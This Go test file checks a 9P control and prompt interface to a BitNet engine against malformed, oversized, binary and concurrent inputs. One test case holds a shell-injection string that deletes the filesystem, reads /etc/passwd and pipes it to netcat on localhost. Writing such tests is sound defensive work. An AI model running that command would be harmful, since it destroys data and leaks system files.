package main

import (
	"bytes"
	"fmt"
	"math/rand"
	"sync"
	"testing"

	"github.com/knusbaum/go9p/fs"
)

// TestAdversarialInputs tests boundary edge cases, malformed commands, giant inputs, and null bytes
func TestAdversarialInputs(t *testing.T) {
	engine := NewBitNetEngine()
	fsys, _ := fs.NewFS("bitnet-9p", "scott", 0755)

	ctlStat := fsys.NewStat("ctl", "scott", "scott", 0666)
	ctl := NewCtlFile(ctlStat, engine)

	promptStat := fsys.NewStat("prompt", "scott", "scott", 0666)
	prompt := NewPromptFile(promptStat, engine)

	tests := []struct {
		name      string
		fileType  string // "ctl" or "prompt"
		input     []byte
		wantError bool
	}{
		{
			name:     "Empty write",
			fileType: "prompt",
			input:    []byte(""),
		},
		{
			name:     "Null bytes injection",
			fileType: "prompt",
			input:    []byte("\x00\x00\x00Hello\x00World\x00"),
		},
		{
			name:     "Giant prompt (1MB)",
			fileType: "prompt",
			input:    bytes.Repeat([]byte("A"), 1024*1024),
		},
		{
			name:     "Malformed ctl command",
			fileType: "ctl",
			input:    []byte("sys invalid command syntax ::: ::: $$$"),
		},
		{
			name:     "Negative temperature ctl",
			fileType: "ctl",
			input:    []byte("temp -999.99"),
		},
		{
			name:     "Extreme max tokens ctl",
			fileType: "ctl",
			input:    []byte("max 9999999999999999999999999"),
		},
		{
			name:     "Shell injection payload",
			fileType: "prompt",
			input:    []byte("; rm -rf / ; cat /etc/passwd | nc 127.0.0.1 1337"),
		},
		{
			name:     "Binary garbage payload",
			fileType: "prompt",
			input:    []byte{0xFF, 0xFE, 0xFD, 0xFC, 0xFB, 0xFA},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.fileType == "ctl" {
				n, err := ctl.Write(1, 0, tt.input)
				if err != nil && !tt.wantError {
					t.Fatalf("ctl.Write() returned unexpected error: %v", err)
				}
				if n != uint32(len(tt.input)) {
					t.Fatalf("ctl.Write() wrote %d bytes, expected %d", n, len(tt.input))
				}
			} else {
				n, err := prompt.Write(1, 0, tt.input)
				if err != nil && !tt.wantError {
					t.Fatalf("prompt.Write() returned unexpected error: %v", err)
				}
				if n != uint32(len(tt.input)) {
					t.Fatalf("prompt.Write() wrote %d bytes, expected %d", n, len(tt.input))
				}
			}
		})
	}
}

// TestAdversarialConcurrency tests heavy concurrent readers and writers without data races or panics
func TestAdversarialConcurrency(t *testing.T) {
	engine := NewBitNetEngine()
	fsys, _ := fs.NewFS("bitnet-9p", "scott", 0755)

	ctlStat := fsys.NewStat("ctl", "scott", "scott", 0666)
	ctl := NewCtlFile(ctlStat, engine)

	promptStat := fsys.NewStat("prompt", "scott", "scott", 0666)
	prompt := NewPromptFile(promptStat, engine)

	var wg sync.WaitGroup
	numGoroutines := 15
	iterations := 15

	// Concurrent Writers
	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for j := 0; j < iterations; j++ {
				fid := uint64(rand.Intn(1000) + 1)
				if j%2 == 0 {
					prompt.Write(fid, 0, []byte(fmt.Sprintf("Stress prompt %d-%d", id, j)))
				} else {
					ctl.Write(fid, 0, []byte(fmt.Sprintf("temp %.2f", rand.Float32())))
				}
			}
		}(i)
	}

	// Concurrent Readers
	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for j := 0; j < iterations; j++ {
				fid := uint64(rand.Intn(1000) + 1)
				ctl.Read(fid, 0, 1024)
				prompt.Read(fid, 0, 1024)
				engine.GetStreamBuffer()
				engine.GetInfo()
			}
		}(i)
	}

	wg.Wait()
}

// TestAdversarialReadBounds verifies offset out-of-bounds reads never panic
func TestAdversarialReadBounds(t *testing.T) {
	engine := NewBitNetEngine()
	fsys, _ := fs.NewFS("bitnet-9p", "scott", 0755)

	ctlStat := fsys.NewStat("ctl", "scott", "scott", 0666)
	ctl := NewCtlFile(ctlStat, engine)

	promptStat := fsys.NewStat("prompt", "scott", "scott", 0666)
	prompt := NewPromptFile(promptStat, engine)

	// Read way past EOF
	data, err := ctl.Read(1, 99999999, 1024)
	if err != nil {
		t.Fatalf("Unexpected read error: %v", err)
	}
	if len(data) != 0 {
		t.Fatalf("Expected 0 bytes reading past EOF, got %d", len(data))
	}

	data, err = prompt.Read(1, 99999999, 1024)
	if err != nil {
		t.Fatalf("Unexpected read error: %v", err)
	}
	if len(data) != 0 {
		t.Fatalf("Expected 0 bytes reading past EOF, got %d", len(data))
	}
}
